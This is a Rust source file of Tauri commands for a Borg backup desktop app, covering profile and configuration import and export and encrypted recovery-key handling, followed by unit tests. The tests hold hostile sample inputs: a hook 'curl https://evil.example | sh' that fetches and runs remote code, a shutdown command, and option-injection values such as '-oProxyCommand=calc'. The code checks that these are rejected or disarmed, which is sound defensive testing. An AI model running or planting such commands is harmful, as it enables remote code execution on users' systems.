#[tauri::command]
pub async fn preview_archive_name(
    app: tauri::AppHandle,
    template: String,
) -> Result<String, String> {
    let template = if template.trim().is_empty() {
        archive_naming::DEFAULT_TEMPLATE.to_string()
    } else {
        template
    };
    let data = read_profiles(&app).await?;
    let profile_name = data.active().map(|p| p.name.as_str()).unwrap_or("default");
    let hostname = archive_naming::current_hostname();
    let random = archive_naming::random_suffix();
    let ctx = TemplateContext {
        now: chrono::Utc::now(),
        hostname: &hostname,
        profile: profile_name,
        random: &random,
    };
    let expanded = archive_naming::expand(&template, &ctx);
    borg_core::config::validate_archive_name(&expanded).map_err(|e| e.to_string())?;
    Ok(expanded)
}

#[tauri::command]
pub async fn delete_profile(app: tauri::AppHandle, id: String) -> Result<(), String> {
    let mut data = read_profiles(&app).await?;
    data.remove(&id)?;
    write_profiles(&app, &data).await
}

#[tauri::command]
pub async fn open_log_folder(app: tauri::AppHandle) -> Result<(), String> {
    let path = app.path().app_log_dir().map_err(|e| e.to_string())?;
    tokio::fs::create_dir_all(&path)
        .await
        .map_err(|e| e.to_string())?;
    tokio::task::spawn_blocking(move || {
        #[cfg(target_os = "windows")]
        let result = std::process::Command::new("explorer").arg(&path).spawn();
        #[cfg(target_os = "macos")]
        let result = std::process::Command::new("open").arg(&path).spawn();
        #[cfg(all(unix, not(target_os = "macos")))]
        let result = std::process::Command::new("xdg-open").arg(&path).spawn();
        result.map(|_| ()).map_err(|e| e.to_string())
    })
    .await
    .map_err(|e| e.to_string())?
}

#[tauri::command]
pub async fn export_support_bundle(app: tauri::AppHandle, path: String) -> Result<(), String> {
    let config_dir = config_dir(&app).await?;
    let log_dir = app.path().app_log_dir().map_err(|e| e.to_string())?;
    diagnostics::export_support_bundle(&config_dir, &log_dir, &PathBuf::from(path)).await
}

#[tauri::command]
pub async fn export_configuration(app: tauri::AppHandle, path: String) -> Result<(), String> {
    let config_dir = config_dir(&app).await?;
    diagnostics::export_configuration(&config_dir, &PathBuf::from(path)).await
}

#[tauri::command]
pub async fn preview_configuration_import(
    app: tauri::AppHandle,
    path: String,
) -> Result<ImportPreview, String> {
    let config_dir = config_dir(&app).await?;
    diagnostics::preview_import(&config_dir, &PathBuf::from(path)).await
}

#[tauri::command]
pub async fn import_configuration(app: tauri::AppHandle, path: String) -> Result<(), String> {
    let config_dir = config_dir(&app).await?;
    diagnostics::import_configuration(&config_dir, &PathBuf::from(path)).await
}

#[tauri::command]
pub async fn export_recovery_key(
    app: tauri::AppHandle,
    state: State<'_, AppState>,
    path: String,
    recovery_passphrase: String,
) -> Result<(), String> {
    if recovery_passphrase.is_empty() {
        return Err("recovery passphrase cannot be empty".into());
    }
    let destination = PathBuf::from(path);
    if destination.exists() {
        return Err("destination already exists; choose a new file name".into());
    }

    let data = read_profiles(&app).await?;
    let profile = data
        .active()
        .cloned()
        .ok_or_else(|| "no active profile; configure repository first".to_string())?;
    precheck_repo(&profile.repo).await?;
    let passphrase = lookup_passphrase(&profile.repo);
    let info = state
        .borg
        .info(&profile.repo, passphrase.as_deref())
        .await
        .map_err(|error| error.detail())?;
    let repository_id = info
        .pointer("/repository/id")
        .and_then(serde_json::Value::as_str)
        .ok_or_else(|| "Borg did not return a repository identifier".to_string())?
        .to_string();

    let dir = config_dir(&app).await?;
    let plain = crate::recovery::restrictive_temp(&dir)?;
    let plain_path = plain.path().to_path_buf();
    let export_result = state
        .borg
        .export_key(&profile.repo, &plain_path, passphrase.as_deref())
        .await;
    if let Err(error) = export_result {
        let _ = crate::recovery::secure_remove(plain);
        return Err(error.detail());
    }

    let read_result = tokio::fs::read(&plain_path).await;
    let cleanup = crate::recovery::secure_remove(plain);
    let mut key = read_result.map_err(|error| error.to_string())?;
    if let Err(error) = cleanup {
        use zeroize::Zeroize;
        key.zeroize();
        return Err(format!("could not securely remove temporary key: {error}"));
    }
    let envelope = crate::recovery::encrypt(key, repository_id, recovery_passphrase)?;
    let encoded = serde_json::to_vec_pretty(&envelope).map_err(|error| error.to_string())?;
    tokio::task::spawn_blocking(move || crate::recovery::write_exclusive(&destination, &encoded))
        .await
        .map_err(|error| error.to_string())??;
    history::append_readiness_event(
        &dir,
        history::ReadinessEvent {
            timestamp: chrono::Utc::now().to_rfc3339(),
            profile_id: profile.id.clone(),
            kind: "key_export".into(),
            outcome: "success".into(),
        },
    )
    .await?;
    let mut data = read_profiles(&app).await?;
    data.active_mut()
        .ok_or_else(|| "active profile disappeared".to_string())?
        .hardening
        .recovery_key_exported = true;
    write_profiles(&app, &data).await
}

#[tauri::command]
pub async fn import_recovery_key(
    app: tauri::AppHandle,
    state: State<'_, AppState>,
    path: String,
    recovery_passphrase: String,
) -> Result<(), String> {
    let source = tokio::fs::read(path)
        .await
        .map_err(|error| error.to_string())?;
    let envelope = crate::recovery::parse(&source)?;
    let mut key = crate::recovery::decrypt(&envelope, recovery_passphrase)?;
    let data = read_profiles(&app).await?;
    let profile = data
        .active()
        .cloned()
        .ok_or_else(|| "no active profile; configure repository first".to_string())?;
    precheck_repo(&profile.repo).await?;

    let dir = config_dir(&app).await?;
    let mut plain = crate::recovery::restrictive_temp(&dir)?;
    use std::io::Write;
    use zeroize::Zeroize;
    if let Err(error) = plain.write_all(&key) {
        key.zeroize();
        let _ = crate::recovery::secure_remove(plain);
        return Err(error.to_string());
    }
    key.zeroize();
    if let Err(error) = plain.as_file_mut().sync_all() {
        let _ = crate::recovery::secure_remove(plain);
        return Err(error.to_string());
    }
    let plain_path = plain.path().to_path_buf();
    let repo_passphrase = lookup_passphrase(&profile.repo);
    let result = state
        .borg
        .import_key(&profile.repo, &plain_path, repo_passphrase.as_deref())
        .await;
    let cleanup = crate::recovery::secure_remove(plain);
    cleanup.map_err(|error| format!("could not securely remove temporary key: {error}"))?;
    result.map_err(|error| error.detail())
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A minimal valid profile export, with `extra` top-level fields merged in.
    fn profile_json(extra: serde_json::Value) -> String {
        let mut base = serde_json::json!({
            "id": "imported",
            "name": "Imported",
            "repo": {
                "ssh_host": "backup.example.com",
                "ssh_port": 22,
                "ssh_user": "borg",
                "repo_path": "/data/repo",
                "ssh_key_path": null
            }
        });
        base.as_object_mut()
            .unwrap()
            .extend(extra.as_object().unwrap().clone());
        serde_json::to_string(&base).unwrap()
    }

    /// The frontend suppresses its own "Failed to change passphrase:" prefix
    /// when it sees this exact text, so the two copies must not drift apart.
    /// Mirrors `PASSPHRASE_ROTATED_UNSAVED_PREFIX` in
    /// `app-tauri/src/lib/passphrase-save.ts` (asserted there in
    /// `passphrase-save.test.ts`).
    #[test]
    fn rotated_unsaved_error_keeps_the_prefix_the_frontend_matches() {
        assert_eq!(
            PASSPHRASE_ROTATED_UNSAVED_PREFIX,
            "The repository passphrase was changed, but the stored copy could not be updated"
        );
        let message = rotated_unsaved_error("keyring locked");
        assert!(
            message.starts_with(PASSPHRASE_ROTATED_UNSAVED_PREFIX),
            "{message}"
        );
        assert!(message.contains("keyring locked"), "{message}");
        // The user must be told the repo already moved and how to recover.
        assert!(message.contains("NEW passphrase"), "{message}");
        assert!(message.contains("Only update the stored copy"), "{message}");
    }

    /// A timeout leaves the rotation genuinely undecided — borg is not killed,
    /// so it may still commit after we stop waiting. Reporting "failed" would
    /// be a guess, and the wrong one half the time.
    #[test]
    fn rotation_indeterminate_error_keeps_the_prefix_the_frontend_matches() {
        assert_eq!(
            PASSPHRASE_ROTATION_INDETERMINATE_PREFIX,
            "The passphrase change timed out, so it may or may not have been applied"
        );
        let message = rotation_indeterminate_error("operation timed out after 120s");
        assert!(
            message.starts_with(PASSPHRASE_ROTATION_INDETERMINATE_PREFIX),
            "{message}"
        );
        assert!(message.contains("timed out after 120s"), "{message}");
        assert!(message.contains("NOT updated"), "{message}");
        assert!(message.contains("Only update the stored copy"), "{message}");
    }

    /// Neither message may carry the secret it is reporting about.
    #[test]
    fn passphrase_failure_messages_never_echo_a_passphrase() {
        // The cause is the only caller-supplied text, and it comes from a
        // keyring/borg error — never from the passphrase itself. Guard against a
        // future refactor threading the passphrase in as the `cause`.
        for message in [
            rotated_unsaved_error("keyring locked"),
            rotation_indeterminate_error("operation timed out after 120s"),
        ] {
            assert!(!message.contains("hunter2"), "{message}");
        }
    }

    #[test]
    fn imported_profile_parses_when_valid() {
        let profile = parse_imported_profile(&profile_json(serde_json::json!({}))).unwrap();
        assert_eq!(profile.name, "Imported");
    }

    #[test]
    fn imported_profile_hooks_are_disarmed() {
        let json = profile_json(serde_json::json!({
            "pre_backup": "curl https://evil.example | sh",
            "post_backup": "shutdown /s"
        }));
        let profile = parse_imported_profile(&json).unwrap();
        // Hooks reach a real shell sink (cmd /C, sh -c); imported ones must
        // never be armed until the user re-enters them deliberately.
        assert!(profile.pre_backup.is_none());
        assert!(profile.post_backup.is_none());
    }

    #[test]
    fn imported_profile_rejects_option_like_fields() {
        for extra in [
            serde_json::json!({"backup_selection": {"source_paths": ["--exclude=*"]}}),
            serde_json::json!({"secondary_repo": {
                "ssh_host": "", "ssh_port": 0, "ssh_user": "",
                "repo_path": "-oProxyCommand=calc", "ssh_key_path": null
            }}),
            serde_json::json!({"archive_template": "--glob-archives"}),
            serde_json::json!({"repo": {
                "ssh_host": "", "ssh_port": 0, "ssh_user": "",
                "repo_path": "-evil", "ssh_key_path": null
            }}),
        ] {
            let json = profile_json(extra);
            assert!(
                parse_imported_profile(&json).is_err(),
                "should reject: {json}"
            );
        }
    }

    #[tokio::test]
    async fn test_ssh_connection_rejects_option_like_host_and_user() {
        // Both must fail at the validation gate, before ssh is ever spawned.
        let err = test_ssh_connection("-oProxyCommand=calc".into(), 22, "borg".into(), None)
            .await
            .unwrap_err();
        assert!(err.contains("cannot start with '-'"), "got: {err}");
        let err = test_ssh_connection("host.example.com".into(), 22, "-l".into(), None)
            .await
            .unwrap_err();
        assert!(err.contains("cannot start with '-'"), "got: {err}");
    }

    #[test]
    fn replacement_search_cancels_only_search_operations() {
        let state = AppState::new(BorgClient::new(PathBuf::from("borg")));
        let old_search = state
            .try_register_cancel("restore-search:old", "busy")
            .unwrap();
        let backup = state.try_register_cancel(BACKUP_OP, "busy").unwrap();
        assert!(state.cancel_prefix(RESTORE_SEARCH_PREFIX));
        assert!(old_search.is_cancelled());
        assert!(!backup.is_cancelled());
    }

    #[test]
    fn logical_backup_result_distinguishes_partial_failure() {
        let attempt = |destination: &str, outcome: &str| DestinationAttemptResult {
            destination: destination.into(),
            outcome: outcome.into(),
            warnings: Vec::new(),
        };
        assert_eq!(
            logical_backup_outcome(&[
                attempt("primary", "success"),
                attempt("secondary", "failure")
            ]),
            "partial_success"
        );
        assert_eq!(
            logical_backup_outcome(&[
                attempt("primary", "failure"),
                attempt("secondary", "failure")
            ]),
            "failure"
        );
    }
}
